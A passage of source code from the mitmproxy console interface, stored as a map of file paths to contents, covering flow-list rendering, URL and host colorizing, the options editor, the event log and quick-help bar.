else:\n                c_text = text\n                c_attr = attr\n        else:\n            trim = urwid.util.calc_trim_text(text, 0, width - 1, 0, width - 1)\n            visible_text = text[0 : trim[1]]\n            if trim[3] == 1:\n                visible_text += \" \"\n            c_text = visible_text + SYMBOL_ELLIPSIS\n            c_attr = urwid.util.rle_subseg(attr, 0, len(visible_text.encode())) + [\n                (\"focus\", len(SYMBOL_ELLIPSIS.encode()))\n            ]\n\n        if self.align == \"right\":\n            c_text = c_text[::-1]\n            c_attr = c_attr[::-1]\n\n        return urwid.TextCanvas([c_text.encode()], [c_attr], maxcol=width)\n\n\ndef truncated_plain(text, attr, align=\"left\"):\n    return TruncatedText(text, [(attr, len(text.encode()))], align)\n\n\n# Work around https://github.com/urwid/urwid/pull/330\ndef rle_append_beginning_modify(rle, a_r):\n    \"\"\"\n    Append (a, r) (unpacked from *a_r*) to BEGINNING of rle.\n    Merge with first run when possible\n\n    MODIFIES rle parameter contents. Returns None.\n    \"\"\"\n    a, r = a_r\n    if not rle:\n        rle[:] = [(a, r)]\n    else:\n        al, run = rle[0]\n        if a == al:\n            rle[0] = (a, run + r)\n        else:\n            rle[0:0] = [(a, r)]\n\n\ndef colorize_host(host: str):\n    tld = get_tld(host)\n    sld = get_sld(host)\n\n    attr: list = []\n\n    tld_size = len(tld)\n    sld_size = len(sld) - tld_size\n\n    for letter in reversed(range(len(host))):\n        character = host[letter]\n        if tld_size > 0:\n            style = \"url_domain\"\n            tld_size -= 1\n        elif tld_size == 0:\n            style = \"text\"\n            tld_size -= 1\n        elif sld_size > 0:\n            sld_size -= 1\n            style = \"url_extension\"\n        else:\n            style = \"text\"\n        rle_append_beginning_modify(attr, (style, len(character.encode())))\n    return attr\n\n\ndef colorize_req(s: str):\n    path = s.split(\"?\", 2)[0]\n    i_query = len(path)\n    i_last_slash = path.rfind(\"/\")\n    i_ext = path[i_last_slash + 1 :].rfind(\".\")\n    i_ext = i_last_slash + i_ext if i_ext >= 0 else len(s)\n    in_val = False\n    attr: list = []\n    for i in range(len(s)):\n        c = s[i]\n        if (\n            (i < i_query and c == \"/\")\n            or (i < i_query and i > i_last_slash and c == \".\")\n            or (i == i_query)\n        ):\n            a = \"url_punctuation\"\n        elif i > i_query:\n            if in_val:\n                if c == \"&\":\n                    in_val = False\n                    a = \"url_punctuation\"\n                else:\n                    a = \"url_query_value\"\n            else:\n                if c == \"=\":\n                    in_val = True\n                    a = \"url_punctuation\"\n                else:\n                    a = \"url_query_key\"\n        elif i > i_ext:\n            a = \"url_extension\"\n        elif i > i_last_slash:\n            a = \"url_filename\"\n        else:\n            a = \"text\"\n        urwid.util.rle_append_modify(attr, (a, len(c.encode())))\n    return attr\n\n\ndef colorize_url(url):\n    parts = url.split(\"/\", 3)\n    if len(parts) < 4 or len(parts[1]) > 0 or parts[0][-1:] != \":\":\n        return [(\"error\", len(url))]  # bad URL\n    return (\n        [\n            (SCHEME_STYLES.get(parts[0], \"scheme_other\"), len(parts[0]) - 1),\n            (\"url_punctuation\", 3),  # ://\n        ]\n        + colorize_host(parts[2])\n        + colorize_req(\"/\" + parts[3])\n    )\n\n\ndef format_http_content_type(content_type: str) -> tuple[str, str]:\n    content_type = content_type.split(\";\")[0]\n    if content_type.endswith(\"/javascript\"):\n        style = \"content_script\"\n    elif content_type.startswith(\"text/\"):\n        style = \"content_text\"\n    elif (\n        content_type.startswith(\"image/\")\n        or content_type.startswith(\"video/\")\n        or content_type.startswith(\"font/\")\n        or \"/x-font-\" in content_type\n    ):\n        style = \"content_media\"\n    elif content_type.endswith(\"/json\") or content_type.endswith(\"/xml\"):\n        style = \"content_data\"\n    elif content_type.startswith(\"application/\"):\n        style = \"content_raw\"\n    else:\n        style = \"content_other\"\n    return content_type, style\n\n\ndef format_duration(duration: float) -> tuple[str, str]:\n    pretty_duration = human.pretty_duration(duration)\n    style = \"gradient_%02d\" % int(\n        99 - 100 * min(math.log2(1 + 1000 * duration) / 12, 0.99)\n    )\n    return pretty_duration, style\n\n\ndef format_size(num_bytes: int) -> tuple[str, str]:\n    pretty_size = human.pretty_size(num_bytes)\n    style = \"gradient_%02d\" % int(99 - 100 * min(math.log2(1 + num_bytes) / 20, 0.99))\n    return pretty_size, style\n\n\ndef format_left_indicators(*, focused: bool, intercepted: bool, timestamp: float):\n    indicators: list[str | tuple[str, str]] = []\n    if focused:\n        indicators.append((\"focus\", \">>\"))\n    else:\n        indicators.append(\"  \")\n    pretty_timestamp = human.format_timestamp(timestamp)[-8:]\n    if intercepted:\n        indicators.append((\"intercept\", pretty_timestamp))\n    else:\n        indicators.append((\"text\", pretty_timestamp))\n    return \"fixed\", 10, urwid.Text(indicators)\n\n\ndef format_right_indicators(\n    *,\n    replay: bool,\n    marked: str,\n):\n    indicators: list[str | tuple[str, str]] = []\n    if replay:\n        indicators.append((\"replay\", SYMBOL_REPLAY))\n    else:\n        indicators.append(\" \")\n    if bool(marked):\n        indicators.append((\"mark\", render_marker(marked)))\n    else:\n        indicators.append(\"  \")\n    return \"fixed\", 3, urwid.Text(indicators)\n\n\n@lru_cache(maxsize=800)\ndef format_http_flow_list(\n    *,\n    render_mode: RenderMode,\n    focused: bool,\n    marked: str,\n    is_replay: bool,\n    request_method: str,\n    request_scheme: str,\n    request_host: str,\n    request_path: str,\n    request_url: str,\n    request_http_version: str,\n    request_timestamp: float,\n    request_is_push_promise: bool,\n    intercepted: bool,\n    response_code: int | None,\n    response_reason: str | None,\n    response_content_length: int | None,\n    response_content_type: str | None,\n    duration: float | None,\n    error_message: str | None,\n) -> urwid.Widget:\n    req = []\n\n    if render_mode is RenderMode.DETAILVIEW:\n        req.append(fcol(human.format_timestamp(request_timestamp), \"highlight\"))\n    else:\n        if focused:\n            req.append(fcol(\">>\", \"focus\"))\n        else:\n            req.append(fcol(\"  \", \"focus\"))\n\n    method_style = HTTP_REQUEST_METHOD_STYLES.get(request_method, \"method_other\")\n    req.append(fcol(request_method, method_style))\n\n    if request_is_push_promise:\n        req.append(fcol(\"PUSH_PROMISE\", \"method_http2_push\"))\n\n    preamble_len = sum(x[1] for x in req) + len(req) - 1\n\n    if request_http_version not in (\"HTTP/1.0\", \"HTTP/1.1\"):\n        request_url += \" \" + request_http_version\n    if intercepted and not response_code:\n        url_style = \"intercept\"\n    elif response_code or error_message:\n        url_style = \"text\"\n    else:\n        url_style = \"title\"\n\n    if render_mode is RenderMode.DETAILVIEW:\n        req.append(urwid.Text([(url_style, request_url)]))\n    else:\n        req.append(truncated_plain(request_url, url_style))\n\n    req.append(format_right_indicators(replay=is_replay, marked=marked))\n\n    resp = [(\"fixed\", preamble_len, urwid.Text(\"\"))]\n    if response_code:\n        if intercepted:\n            style = \"intercept\"\n        else:\n            style = \"\"\n\n        status_style = style or HTTP_RESPONSE_CODE_STYLE.get(\n            response_code // 100, \"code_other\"\n        )\n        resp.append(fcol(SYMBOL_RETURN, status_style))\n        resp.append(fcol(str(response_code), status_style))\n        if response_reason and render_mode is RenderMode.DETAILVIEW:\n            resp.append(fcol(response_reason, status_style))\n\n        if response_content_type:\n            ct, ct_style = format_http_content_type(response_content_type)\n            resp.append(fcol(ct, style or ct_style))\n\n        if response_content_length:\n            size, size_style = format_size(response_content_length)\n        elif response_content_length == 0:\n            size = \"[no content]\"\n            size_style = \"text\"\n        else:\n            size = \"[content missing]\"\n            size_style = \"text\"\n        resp.append(fcol(size, style or size_style))\n\n        if duration:\n            dur, dur_style = format_duration(duration)\n            resp.append(fcol(dur, style or dur_style))\n    elif error_message:\n        resp.append(fcol(SYMBOL_RETURN, \"error\"))\n        resp.append(urwid.Text([(\"error\", error_message)]))\n\n    return urwid.Pile(\n        [urwid.Columns(req, dividechars=1), urwid.Columns(resp, dividechars=1)]\n    )\n\n\n@lru_cache(maxsize=800)\ndef format_http_flow_table(\n    *,\n    render_mode: RenderMode,\n    focused: bool,\n    marked: str,\n    is_replay: str | None,\n    request_method: str,\n    request_scheme: str,\n    request_host: str,\n    request_path: str,\n    request_url: str,\n    request_http_version: str,\n    request_timestamp: float,\n    request_is_push_promise: bool,\n    intercepted: bool,\n    response_code: int | None,\n    response_reason: str | None,\n    response_content_length: int | None,\n    response_content_type: str | None,\n    duration: float | None,\n    error_message: str | None,\n) -> urwid.Widget:\n    items = [\n        format_left_indicators(\n            focused=focused, intercepted=intercepted, timestamp=request_timestamp\n        )\n    ]\n\n    if intercepted and not response_code:\n        request_style = \"intercept\"\n    else:\n        request_style = \"\"\n\n    scheme_style = request_style or SCHEME_STYLES.get(request_scheme, \"scheme_other\")\n    items.append(fcol(fixlen(request_scheme.upper(), 5), scheme_style))\n\n    if request_is_push_promise:\n        method_style = \"method_http2_push\"\n    else:\n        method_style = request_style or HTTP_REQUEST_METHOD_STYLES.get(\n            request_method, \"method_other\"\n        )\n    items.append(fcol(fixlen(request_method, 4), method_style))\n\n    items.append(\n        (\n            \"weight\",\n            0.25,\n            TruncatedText(request_host, colorize_host(request_host), \"right\"),\n        )\n    )\n    items.append(\n        (\"weight\", 1.0, TruncatedText(request_path, colorize_req(request_path), \"left\"))\n    )\n\n    if intercepted and response_code:\n        response_style = \"intercept\"\n    else:\n        response_style = \"\"\n\n    if response_code:\n        status = str(response_code)\n        status_style = response_style or HTTP_RESPONSE_CODE_STYLE.get(\n            response_code // 100, \"code_other\"\n        )\n\n        if response_content_length and response_content_type:\n            content, content_style = format_http_content_type(response_content_type)\n            content_style = response_style or content_style\n        elif response_content_length:\n            content = \"\"\n            content_style = \"content_none\"\n        elif response_content_length == 0:\n            content = \"[no content]\"\n            content_style = \"content_none\"\n        else:\n            content = \"[content missing]\"\n            content_style = \"content_none\"\n\n    elif error_message:\n        status = \"err\"\n        status_style = \"error\"\n        content = error_message\n        content_style = \"error\"\n\n    else:\n        status = \"\"\n        status_style = \"text\"\n        content = \"\"\n        content_style = \"\"\n\n    items.append(fcol(fixlen(status, 3), status_style))\n    items.append((\"weight\", 0.15, truncated_plain(content, content_style, \"right\")))\n\n    if response_content_length:\n        size, size_style = format_size(response_content_length)\n        items.append(fcol(fixlen_r(size, 5), response_style or size_style))\n    else:\n        items.append((\"fixed\", 5, urwid.Text(\"\")))\n\n    if duration:\n        duration_pretty, duration_style = format_duration(duration)\n        items.append(\n            fcol(fixlen_r(duration_pretty, 5), response_style or duration_style)\n        )\n    else:\n        items.append((\"fixed\", 5, urwid.Text(\"\")))\n\n    items.append(\n        format_right_indicators(\n            replay=bool(is_replay),\n            marked=marked,\n        )\n    )\n    return urwid.Columns(items, dividechars=1, min_width=15)\n\n\n@lru_cache(maxsize=800)\ndef format_message_flow(\n    *,\n    render_mode: RenderMode,\n    focused: bool,\n    timestamp_start: float,\n    marked: str,\n    protocol: str,\n    client_address,\n    server_address,\n    total_size: int,\n    duration: float | None,\n    error_message: str | None,\n):\n    conn = f\"{human.format_address(client_address)} <-> {human.format_address(server_address)}\"\n\n    items = []\n\n    if render_mode in (RenderMode.TABLE, RenderMode.DETAILVIEW):\n        items.append(\n            format_left_indicators(\n                focused=focused, intercepted=False, timestamp=timestamp_start\n            )\n        )\n    else:\n        if focused:\n            items.append(fcol(\">>\", \"focus\"))\n        else:\n            items.append(fcol(\"  \", \"focus\"))\n\n    if render_mode is RenderMode.TABLE:\n        items.append(fcol(fixlen(protocol.upper(), 5), SCHEME_STYLES[protocol]))\n    else:\n        items.append(fcol(protocol.upper(), SCHEME_STYLES[protocol]))\n\n    items.append((\"weight\", 1.0, truncated_plain(conn, \"text\", \"left\")))\n    if error_message:\n        items.append((\"weight\", 1.0, truncated_plain(error_message, \"error\", \"left\")))\n\n    if total_size:\n        size, size_style = format_size(total_size)\n        items.append(fcol(fixlen_r(size, 5), size_style))\n    else:\n        items.append((\"fixed\", 5, urwid.Text(\"\")))\n\n    if duration:\n        duration_pretty, duration_style = format_duration(duration)\n        items.append(fcol(fixlen_r(duration_pretty, 5), duration_style))\n    else:\n        items.append((\"fixed\", 5, urwid.Text(\"\")))\n\n    items.append(format_right_indicators(replay=False, marked=marked))\n\n    return urwid.Pile([urwid.Columns(items, dividechars=1, min_width=15)])\n\n\n@lru_cache(maxsize=800)\ndef format_dns_flow(\n    *,\n    render_mode: RenderMode,\n    focused: bool,\n    intercepted: bool,\n    marked: str,\n    is_replay: str | None,\n    op_code: str,\n    request_timestamp: float,\n    domain: str,\n    type: str,\n    response_code: str | None,\n    response_code_http_equiv: int,\n    answer: str | None,\n    error_message: str,\n    duration: float | None,\n):\n    items = []\n\n    if render_mode in (RenderMode.TABLE, RenderMode.DETAILVIEW):\n        items.append(\n            format_left_indicators(\n                focused=focused, intercepted=intercepted, timestamp=request_timestamp\n            )\n        )\n    else:\n        items.append(fcol(\">>\" if focused else \"  \", \"focus\"))\n\n    scheme_style = \"intercepted\" if intercepted else SCHEME_STYLES[\"dns\"]\n    t = f\"DNS {op_code}\"\n    if render_mode is RenderMode.TABLE:\n        t = fixlen(t, 10)\n    items.append(fcol(t, scheme_style))\n    items.append((\"weight\", 0.5, TruncatedText(domain, colorize_host(domain), \"right\")))\n    items.append(fcol(\"(\" + fixlen(type, 5)[: len(type)] + \") =\", \"text\"))\n\n    items.append(\n        (\n            \"weight\",\n            1,\n            (\n                truncated_plain(\n                    \"...\" if answer is None else \"?\" if not answer else answer, \"text\"\n                )\n                if error_message is None\n                else truncated_plain(error_message, \"error\")\n            ),\n        )\n    )\n    status_style = (\n        \"intercepted\"\n        if intercepted\n        else HTTP_RESPONSE_CODE_STYLE.get(response_code_http_equiv // 100, \"code_other\")\n    )\n    items.append(\n        fcol(fixlen(\"\" if response_code is None else response_code, 9), status_style)\n    )\n\n    if duration:\n        duration_pretty, duration_style = format_duration(duration)\n        items.append(fcol(fixlen_r(duration_pretty, 5), duration_style))\n    else:\n        items.append((\"fixed\", 5, urwid.Text(\"\")))\n\n    items.append(\n        format_right_indicators(\n            replay=bool(is_replay),\n            marked=marked,\n        )\n    )\n    return urwid.Pile([urwid.Columns(items, dividechars=1, min_width=15)])\n\n\ndef format_flow(\n    f: flow.Flow,\n    *,\n    render_mode: RenderMode,\n    hostheader: bool = False,  # pass options directly if we need more stuff from them\n    focused: bool = True,\n) -> urwid.Widget:\n    \"\"\"\n    This functions calls the proper renderer depending on the flow type.\n    We also want to cache the renderer output, so we extract all attributes\n    relevant for display and call the render with only that. This assures that rows\n    are updated if the flow is changed.\n    \"\"\"\n    duration: float | None\n    error_message: str | None\n    if f.error:\n        error_message = f.error.msg\n    else:\n        error_message = None\n\n    if isinstance(f, (TCPFlow, UDPFlow)):\n        total_size = 0\n        for message in f.messages:\n            total_size += len(message.content)\n        if f.messages:\n            duration = f.messages[-1].timestamp - f.client_conn.timestamp_start\n        else:\n            duration = None\n        if f.client_conn.tls_version == \"QUIC\":\n            protocol = \"quic\"\n        else:\n            protocol = f.type\n        return format_message_flow(\n            render_mode=render_mode,\n            focused=focused,\n            timestamp_start=f.client_conn.timestamp_start,\n            marked=f.marked,\n            protocol=protocol,\n            client_address=f.client_conn.peername,\n            server_address=f.server_conn.address,\n            total_size=total_size,\n            duration=duration,\n            error_message=error_message,\n        )\n    elif isinstance(f, DNSFlow):\n        if f.response:\n            duration = f.response.timestamp - f.request.timestamp\n            response_code_str: str | None = dns.response_codes.to_str(\n                f.response.response_code\n            )\n            response_code_http_equiv = dns.response_codes.http_equiv_status_code(\n                f.response.response_code\n            )\n            answer = \", \".join(str(x) for x in f.response.answers)\n        else:\n            duration = None\n            response_code_str = None\n            response_code_http_equiv = 0\n            answer = None\n        return format_dns_flow(\n            render_mode=render_mode,\n            focused=focused,\n            intercepted=f.intercepted,\n            marked=f.marked,\n            is_replay=f.is_replay,\n            op_code=dns.op_codes.to_str(f.request.op_code),\n            request_timestamp=f.request.timestamp,\n            domain=f.request.questions[0].name if f.request.questions else \"\",\n            type=dns.types.to_str(f.request.questions[0].type)\n            if f.request.questions\n            else \"\",\n            response_code=response_code_str,\n            response_code_http_equiv=response_code_http_equiv,\n            answer=answer,\n            error_message=error_message,\n            duration=duration,\n        )\n    elif isinstance(f, HTTPFlow):\n        intercepted = f.intercepted\n        response_content_length: int | None\n        if f.response:\n            if f.response.raw_content is not None:\n                response_content_length = len(f.response.raw_content)\n            else:\n                response_content_length = None\n            response_code: int | None = f.response.status_code\n            response_reason: str | None = f.response.reason\n            response_content_type = f.response.headers.get(\"content-type\")\n            if f.response.timestamp_end:\n                duration = max(\n                    [f.response.timestamp_end - f.request.timestamp_start, 0]\n                )\n            else:\n                duration = None\n        else:\n            response_content_length = None\n            response_code = None\n            response_reason = None\n            response_content_type = None\n            duration = None\n\n        scheme = f.request.scheme\n        if f.websocket is not None:\n            if scheme == \"https\":\n                scheme = \"wss\"\n            elif scheme == \"http\":\n                scheme = \"ws\"\n\n        if render_mode in (RenderMode.LIST, RenderMode.DETAILVIEW):\n            render_func = format_http_flow_list\n        else:\n            render_func = format_http_flow_table\n        return render_func(\n            render_mode=render_mode,\n            focused=focused,\n            marked=f.marked,\n            is_replay=f.is_replay,\n            request_method=f.request.method,\n            request_scheme=scheme,\n            request_host=f.request.pretty_host if hostheader else f.request.host,\n            request_path=f.request.path,\n            request_url=f.request.pretty_url if hostheader else f.request.url,\n            request_http_version=f.request.http_version,\n            request_timestamp=f.request.timestamp_start,\n            request_is_push_promise=\"h2-pushed-stream\" in f.metadata,\n            intercepted=intercepted,\n            response_code=response_code,\n            response_reason=response_reason,\n            response_content_length=response_content_length,\n            response_content_type=response_content_type,\n            duration=duration,\n            error_message=error_message,\n        )\n\n    else:\n        raise NotImplementedError()\n", "mitmproxy/tools/console/options.py": "from __future__ import annotations\n\nimport pprint\nimport textwrap\nfrom collections.abc import Sequence\nfrom typing import Optional\n\nimport urwid\n\nfrom mitmproxy import exceptions\nfrom mitmproxy import optmanager\nfrom mitmproxy.tools.console import layoutwidget\nfrom mitmproxy.tools.console import overlay\nfrom mitmproxy.tools.console import signals\n\nHELP_HEIGHT = 5\n\n\ndef can_edit_inplace(opt):\n    if opt.choices:\n        return False\n    if opt.typespec in [str, int, Optional[str], Optional[int]]:\n        return True\n\n\ndef fcol(s, width, attr):\n    s = str(s)\n    return (\"fixed\", width, urwid.Text((attr, s)))\n\n\nclass OptionItem(urwid.WidgetWrap):\n    def __init__(self, walker, opt, focused, namewidth, editing):\n        self.walker, self.opt, self.focused = walker, opt, focused\n        self.namewidth = namewidth\n        self.editing = editing\n        super().__init__(None)\n        self._w = self.get_widget()\n\n    def get_widget(self):\n        val = self.opt.current()\n        if self.opt.typespec == bool:\n            displayval = \"true\" if val else \"false\"\n        elif not val:\n            displayval = \"\"\n        elif self.opt.typespec == Sequence[str]:\n            displayval = pprint.pformat(val, indent=1)\n        else:\n            displayval = str(val)\n\n        changed = self.walker.master.options.has_changed(self.opt.name)\n        if self.focused:\n            valstyle = \"option_active_selected\" if changed else \"option_selected\"\n        else:\n            valstyle = \"option_active\" if changed else \"text\"\n\n        if self.editing:\n            valw = urwid.Edit(edit_text=displayval)\n        else:\n            valw = urwid.AttrMap(\n                urwid.Padding(urwid.Text([(valstyle, displayval)])), valstyle\n            )\n\n        return urwid.Columns(\n            [\n                (\n                    self.namewidth,\n                    urwid.Text([(\"title\", self.opt.name.ljust(self.namewidth))]),\n                ),\n                valw,\n            ],\n            dividechars=2,\n            focus_column=1,\n        )\n\n    def get_edit_text(self):\n        return self._w[1].get_edit_text()\n\n    def selectable(self):\n        return True\n\n    def keypress(self, size, key):\n        if self.editing:\n            self._w[1].keypress(size, key)\n            return\n        return key\n\n\nclass OptionListWalker(urwid.ListWalker):\n    def __init__(self, master, help_widget: OptionHelp):\n        self.master = master\n        self.help_widget = help_widget\n\n        self.index = 0\n        self.focusobj = None\n\n        self.opts = sorted(master.options.keys())\n        self.maxlen = max(len(i) for i in self.opts)\n        self.editing = False\n        self.set_focus(0)\n        self.master.options.changed.connect(self.sig_mod)\n\n    def sig_mod(self, *args, **kwargs):\n        self.opts = sorted(self.master.options.keys())\n        self.maxlen = max(len(i) for i in self.opts)\n        self._modified()\n        self.set_focus(self.index)\n\n    def start_editing(self):\n        self.editing = True\n        self.focus_obj = self._get(self.index, True)\n        self._modified()\n\n    def stop_editing(self):\n        self.editing = False\n        self.focus_obj = self._get(self.index, False)\n        self.set_focus(self.index)\n        self._modified()\n\n    def get_edit_text(self):\n        return self.focus_obj.get_edit_text()\n\n    def _get(self, pos, editing):\n        name = self.opts[pos]\n        opt = self.master.options._options[name]\n        return OptionItem(self, opt, pos == self.index, self.maxlen, editing)\n\n    def get_focus(self):\n        return self.focus_obj, self.index\n\n    def set_focus(self, index):\n        self.editing = False\n        name = self.opts[index]\n        opt = self.master.options._options[name]\n        self.index = index\n        self.focus_obj = self._get(self.index, self.editing)\n        self.help_widget.update_help_text(opt.help)\n        self._modified()\n\n    def get_next(self, pos):\n        if pos >= len(self.opts) - 1:\n            return None, None\n        pos = pos + 1\n        return self._get(pos, False), pos\n\n    def get_prev(self, pos):\n        pos = pos - 1\n        if pos < 0:\n            return None, None\n        return self._get(pos, False), pos\n\n    def positions(self, reverse=False):\n        if reverse:\n            return reversed(range(len(self.opts)))\n        else:\n            return range(len(self.opts))\n\n\nclass OptionsList(urwid.ListBox):\n    def __init__(self, master, help_widget: OptionHelp):\n        self.master = master\n        self.walker = OptionListWalker(master, help_widget)\n        super().__init__(self.walker)\n\n    def save_config(self, path):\n        try:\n            optmanager.save(self.master.options, path)\n        except exceptions.OptionsError as e:\n            signals.status_message.send(message=str(e))\n\n    def keypress(self, size, key):\n        if self.walker.editing:\n            if key == \"enter\":\n                foc, idx = self.get_focus()\n                v = self.walker.get_edit_text()\n                try:\n                    self.master.options.set(f\"{foc.opt.name}={v}\")\n                except exceptions.OptionsError as v:\n                    signals.status_message.send(message=str(v))\n                self.walker.stop_editing()\n                return None\n            elif key == \"esc\":\n                self.walker.stop_editing()\n                return None\n        else:\n            if key == \"m_start\":\n                self.set_focus(0)\n                self.walker._modified()\n            elif key == \"m_end\":\n                self.set_focus(len(self.walker.opts) - 1)\n                self.walker._modified()\n            elif key == \"m_select\":\n                foc, idx = self.get_focus()\n                if foc.opt.typespec == bool:\n                    self.master.options.toggler(foc.opt.name)()\n                    # Bust the focus widget cache\n                    self.set_focus(self.walker.index)\n                elif can_edit_inplace(foc.opt):\n                    self.walker.start_editing()\n                    self.walker._modified()\n                elif foc.opt.choices:\n                    self.master.overlay(\n                        overlay.Chooser(\n                            self.master,\n                            foc.opt.name,\n                            foc.opt.choices,\n                            foc.opt.current(),\n                            self.master.options.setter(foc.opt.name),\n                        )\n                    )\n                elif foc.opt.typespec == Sequence[str]:\n                    self.master.overlay(\n                        overlay.OptionsOverlay(\n                            self.master,\n                            foc.opt.name,\n                            foc.opt.current(),\n                            HELP_HEIGHT + 5,\n                        ),\n                        valign=\"top\",\n                    )\n                else:\n                    raise NotImplementedError()\n        return super().keypress(size, key)\n\n\nclass OptionHelp(urwid.Frame):\n    def __init__(self, master):\n        self.master = master\n        super().__init__(self.widget(\"\"))\n        self.set_active(False)\n\n    def set_active(self, val):\n        h = urwid.Text(\"Option Help\")\n        style = \"heading\" if val else \"heading_inactive\"\n        self.header = urwid.AttrWrap(h, style)\n\n    def widget(self, txt):\n        cols, _ = self.master.ui.get_cols_rows()\n        return urwid.ListBox([urwid.Text(i) for i in textwrap.wrap(txt, cols)])\n\n    def update_help_text(self, txt: str) -> None:\n        self.set_body(self.widget(txt))\n\n\nclass Options(urwid.Pile, layoutwidget.LayoutWidget):\n    title = \"Options\"\n    keyctx = \"options\"\n\n    focus_position: int\n\n    def __init__(self, master):\n        oh = OptionHelp(master)\n        self.optionslist = OptionsList(master, oh)\n        super().__init__(\n            [\n                self.optionslist,\n                (HELP_HEIGHT, oh),\n            ]\n        )\n        self.master = master\n\n    def current_name(self):\n        foc, idx = self.optionslist.get_focus()\n        return foc.opt.name\n\n    def keypress(self, size, key):\n        if key == \"m_next\":\n            self.focus_position = (self.focus_position + 1) % len(self.widget_list)\n            self.widget_list[1].set_active(self.focus_position == 1)\n            key = None\n\n        # This is essentially a copypasta from urwid.Pile's keypress handler.\n        # So much for \"closed for modification, but open for extension\".\n        item_rows = None\n        if len(size) == 2:\n            item_rows = self.get_item_rows(size, focus=True)\n        i = self.widget_list.index(self.focus_item)\n        tsize = self.get_item_size(size, i, True, item_rows)\n        return self.focus_item.keypress(tsize, key)\n", "mitmproxy/tools/console/eventlog.py": "import collections\n\nimport urwid\n\nfrom mitmproxy import log\nfrom mitmproxy.tools.console import layoutwidget\n\n\nclass LogBufferWalker(urwid.SimpleListWalker):\n    pass\n\n\nclass EventLog(urwid.ListBox, layoutwidget.LayoutWidget):\n    keyctx = \"eventlog\"\n    title = \"Events\"\n\n    def __init__(self, master):\n        self.master = master\n        self.walker = LogBufferWalker(collections.deque(maxlen=self.master.events.size))\n\n        master.events.sig_add.connect(self.add_event)\n        master.events.sig_refresh.connect(self.refresh_events)\n        self.master.options.subscribe(\n            self.refresh_events, [\"console_eventlog_verbosity\"]\n        )\n        self.refresh_events()\n\n        super().__init__(self.walker)\n\n    def load(self, loader):\n        loader.add_option(\n            \"console_focus_follow\", bool, False, \"Focus follows new flows.\"\n        )\n\n    def set_focus(self, index):\n        if 0 <= index < len(self.walker):\n            super().set_focus(index)\n\n    def keypress(self, size, key):\n        if key == \"m_end\":\n            self.set_focus(len(self.walker) - 1)\n        elif key == \"m_start\":\n            self.set_focus(0)\n        return super().keypress(size, key)\n\n    def add_event(self, entry: log.LogEntry):\n        if log.log_tier(self.master.options.console_eventlog_verbosity) < log.log_tier(\n            entry.level\n        ):\n            return\n        txt = f\"{entry.level}: {str(entry.msg)}\"\n        if entry.level in (\"error\", \"warn\", \"alert\"):\n            e = urwid.Text((entry.level, txt))\n        else:\n            e = urwid.Text(txt)\n        self.walker.append(e)\n        if self.master.options.console_focus_follow:\n            self.walker.set_focus(len(self.walker) - 1)\n\n    def refresh_events(self, *_) -> None:\n        self.walker.clear()\n        for event in self.master.events.data:\n            self.add_event(event)\n", "mitmproxy/tools/console/quickhelp.py": "\"\"\"\nThis module is reponsible for drawing the quick key help at the bottom of mitmproxy.\n\"\"\"\n\nfrom dataclasses import dataclass\nfrom typing import Union\n\nimport urwid\n\nfrom mitmproxy import flow\nfrom mitmproxy.http import HTTPFlow\nfrom mitmproxy.tools.console.eventlog import EventLog\nfrom mitmproxy.tools.console.flowlist import FlowListBox\nfrom mitmproxy.tools.console.flowview import FlowView\nfrom mitmproxy.tools.console.grideditor.base import FocusEditor\nfrom mitmproxy.tools.console.help import HelpView\nfrom mitmproxy.tools.console.keybindings import KeyBindings\nfrom mitmproxy.tools.console.keymap import Keymap\nfrom mitmproxy.tools.console.options import Options\n\n\n@dataclass\nclass BasicKeyHelp:\n    \"\"\"Quick help for urwid-builtin keybindings (i.e. those keys that do not appear in the keymap)\"\"\"\n\n    key: str\n\n\nHelpItems = dict[str, Union[str, BasicKeyHelp]]\n\"\"\"\nA mapping from the short text that should be displayed in the help bar to the full help text provided for the key\nbinding. The order of the items in the dictionary determines the order in which they are displayed in the help bar.\n\nSome help items explain builtin urwid functionality, so there is no key binding for them. In this case, the value\nis a BasicKeyHelp object.\n\"\"\"\n\n\n@dataclass\nclass QuickHelp:\n    top_label: str\n    top_items: HelpItems\n    bottom_label: str\n    bottom_items: HelpItems\n\n    def make_rows(self, keymap: Keymap) -> tuple[urwid.Columns, urwid.Columns]:\n        top = _make_row(self.top_label, self.top_items, keymap)\n        bottom = _make_row(self.bottom_label, self.bottom_items, keymap)\n        return top, bottom\n\n\ndef make(\n    widget: type[urwid.Widget],\n    focused_flow: flow.Flow | None,\n    is_root_widget: bool,\n) -> QuickHelp:\n    top_label = \"\"\n    top_items: HelpItems = {}\n    if widget in (FlowListBox, FlowView):\n        top_label = \"Flow:\"\n        if focused_flow:\n            if widget == FlowListBox:\n                top_items[\"Select\"] = \"Select\"\n            else:\n                top_items[\"Edit\"] = \"Edit a flow component\"\n            top_items |= {\n                \"Duplicate\": \"Duplicate flow\",\n                \"Replay\": \"Replay this flow\",\n                \"Export\": \"Export this flow to file\",\n                \"Delete\": \"Delete flow from view\",\n            }\n            if widget == FlowListBox:\n                if focused_flow.marked:\n                    top_items[\"Unmark\"] = \"Toggle mark on this flow\"\n                else:\n                    top_items[\"Mark\"] = \"Toggle mark on this flow\"\n                top_items[\"Edit\"] = \"Edit a flow component\"\n            if focused_flow.intercepted:\n                top_items[\"Resume\"] = \"Resume this intercepted flow\"\n            if focused_flow.modified():\n                top_items[\"Restore\"] = \"Revert changes to this flow\"\n            if isinstance(focused_flow, HTTPFlow) and focused_flow.response:\n                top_items[\"Save body\"] = \"Save response body to file\"\n            if widget == FlowView:\n                top_items |= {\n                    \"Next flow\": \"Go to next flow\",\n                    \"Prev flow\": \"Go to previous flow\",\n                }\n        else:\n            top_items |= {\n                \"Load flows\": \"Load flows from file\",\n                \"Create new\": \"Create a new flow\",\n            }\n    elif widget == KeyBindings:\n        top_label = \"Keybindings:\"\n        top_items |= {\n            \"Add\": \"Add a key binding\",\n            \"Edit\": \"Edit the currently focused key binding\",\n            \"Delete\": \"Unbind the currently focused key binding\",\n            \"Execute\": \"Execute the currently focused key binding\",\n        }\n    elif widget == Options:\n        top_label = \"Options:\"\n        top_items |= {\n            \"Edit\": BasicKeyHelp(\"\u23ce\"),\n            \"Reset\": \"Reset this option\",\n            \"Reset all\": \"Reset all options\",\n            \"Load file\": \"Load from file\",\n            \"Save file\": \"Save to file\",\n        }\n    elif widget == HelpView:\n        top_label = \"Help:\"\n        top_items |= {\n            \"Scroll down\": BasicKeyHelp(\"\u2193\"),\n            \"Scroll up\": BasicKeyHelp(\"\u2191\"),\n            \"Exit help\": \"Exit help\",\n            